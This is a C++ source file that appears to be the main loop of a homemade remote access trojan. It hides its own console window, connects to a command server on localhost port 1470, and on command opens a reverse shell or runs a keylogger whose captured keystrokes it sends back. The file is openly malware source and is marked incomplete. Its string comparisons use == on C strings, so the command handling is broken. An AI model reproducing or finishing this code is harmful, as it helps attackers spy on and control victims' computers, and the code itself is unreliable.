#include "Net.h"
#include "KeyLogger.h"
#include <stdio.h>
#include <stdlib.h>

using namespace std;

int main(void) {

	HWND CurrentWindow;

	AllocConsole();

	CurrentWindow = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(CurrentWindow, 0);
	
	Net NetObject("localhost", 1470);

	char * Command;

	while (true) {

		Command=NetObject.Receive(1024);

		int CommandLength = strlen(Command);

		char KeyLoggerCommand[10];

		strncpy(KeyLoggerCommand, Command, 10);

		if (Command == "reverse_shell") {

			NetObject.ReverseShell();

		}

		if (KeyLoggerCommand == "keylogger") {

			int FunctionLength = strlen(KeyLoggerCommand);

			int ParamLength = CommandLength - FunctionLength - 1;

			const char * Seconds=&Command[CommandLength-ParamLength];
			
			const char * Buffer=KeyLogger::KeyLogger(atoi(Seconds));
			
			NetObject.Send(Buffer);


		}
		
		if(Command=="quit"){
			
			return 0;
			
		}
		
		else{
			
			NetObject.Send("ERROR!");
			
		}

	}
	
	return 0;

	//incomplete

}
